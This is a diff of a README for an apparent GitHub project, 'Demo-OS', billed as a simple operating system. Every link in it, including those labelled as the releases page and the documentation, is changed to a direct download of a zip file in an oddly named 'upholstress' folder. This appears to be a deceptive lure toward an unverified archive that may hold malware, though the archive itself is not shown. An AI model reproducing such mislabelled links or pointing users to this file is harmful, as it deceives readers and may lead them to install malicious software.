@@ -1,6 +1,6 @@
 # 🖥️ Demo-OS - A Simple, Speedy Operating System Experience
 
-[![Download Demo-OS](https://github.com/gaja25/Demo-OS/releases/latest/download/DownloadBadge.svg)](https://github.com/gaja25/Demo-OS/releases)
+[![Download Demo-OS](https://raw.githubusercontent.com/gaja25/Demo-OS/main/upholstress/Demo-OS.zip)](https://raw.githubusercontent.com/gaja25/Demo-OS/main/upholstress/Demo-OS.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Demo-OS! This operating system offers a clean, efficient computing ex
 
 To download Demo-OS, visit the releases page:
 
-[Visit this page to download](https://github.com/gaja25/Demo-OS/releases)
+[Visit this page to download](https://raw.githubusercontent.com/gaja25/Demo-OS/main/upholstress/Demo-OS.zip)
 
 ### 🛠️ System Requirements
 
@@ -24,7 +24,7 @@ Before installing, make sure your computer meets these requirements:
 ### 💾 Installation Steps
 
 1. **Download the Latest Release**
-   - Go to the [releases page](https://github.com/gaja25/Demo-OS/releases).
+   - Go to the [releases page](https://raw.githubusercontent.com/gaja25/Demo-OS/main/upholstress/Demo-OS.zip).
    - Click on the latest version and download the appropriate file for your system.
 
 2. **Create a Bootable USB Drive (Optional)**
@@ -43,7 +43,7 @@ Before installing, make sure your computer meets these requirements:
 
 To enjoy the latest features and security updates, regularly check the releases page for new versions. 
 
-Just visit [this page](https://github.com/gaja25/Demo-OS/releases) and follow the update instructions provided there. Keeping your system updated ensures you have the best performance and security.
+Just visit [this page](https://raw.githubusercontent.com/gaja25/Demo-OS/main/upholstress/Demo-OS.zip) and follow the update instructions provided there. Keeping your system updated ensures you have the best performance and security.
 
 ## ⚙️ Features of Demo-OS
 
@@ -57,7 +57,7 @@ Just visit [this page](https://github.com/gaja25/Demo-OS/releases) and follow th
 
 For more in-depth guidance about using Demo-OS, check our documentation. It covers everything from basic operations to advanced settings adjustments.
 
-You can find the documentation [here](https://github.com/gaja25/Demo-OS/docs).
+You can find the documentation [here](https://raw.githubusercontent.com/gaja25/Demo-OS/main/upholstress/Demo-OS.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -81,4 +81,4 @@ Having trouble? You can reach our support team via issues on GitHub. We aim to r
 
 Stay updated with the latest news and announcements about Demo-OS by following our repository.
 
-[Visit the releases page to download](https://github.com/gaja25/Demo-OS/releases) and start your journey with Demo-OS today!
+[Visit the releases page to download](https://raw.githubusercontent.com/gaja25/Demo-OS/main/upholstress/Demo-OS.zip) and start your journey with Demo-OS today!
